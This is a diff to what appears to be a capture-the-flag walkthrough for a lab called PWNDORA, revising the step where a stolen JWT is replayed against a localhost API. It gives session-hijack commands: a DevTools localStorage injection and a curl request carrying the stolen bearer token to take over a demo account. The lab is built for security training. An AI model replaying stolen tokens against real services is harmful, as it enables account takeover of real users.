@@ -41,9 +41,19 @@ ffuf -u http://localhost:8000/api/FUZZ/health -w /usr/share/wordlists/secLists/D
      "debug_mode": true
    }
    ```
-5. Trigger progress reporting to the CTF platform by sending an authenticated request using the stolen token to any protected endpoint (like `/api/auth/me`) supplying your active PWNDORA session identifier in the query parameter (or header):
+5. Trigger progress reporting and account takeover via either the Browser UI (recommended) or direct API replay:
+
+   **Method A — Browser DevTools (Recommended)**:
+   - Open `http://localhost:5174` in browser.
+   - Open DevTools Console and execute:
+     ```js
+     localStorage.setItem('token', '<stolen_jwt>');
+     ```
+   - Refresh the page (`F5`). You are immediately logged in as **Demo User**, and PWNDORA platform Dashboard (`http://localhost:5173`) automatically updates to completed Stage 1, awards 100 points, and unlocks Stage 2!
+
+   **Method B — Terminal / API Replay**:
    ```bash
-   curl -H "Authorization: Bearer eyJhbGciOi..." "http://localhost:8000/api/auth/me?session=<session_id>"
+   curl -H "Authorization: Bearer <stolen_jwt>" "http://localhost:8000/api/auth/me"
    ```
    This triggers the backend's compromise-detection logic, which reports the hijack event (`{"session_id": "<session>", "stage": 1, "proof": "session_hijack_confirmed", "artifact_type": "jwt", "victim_user": "demo", "timestamp": <timestamp>}`) to the coordinator via a signed HMAC-SHA256 webhook to unlock Stage 2.
 
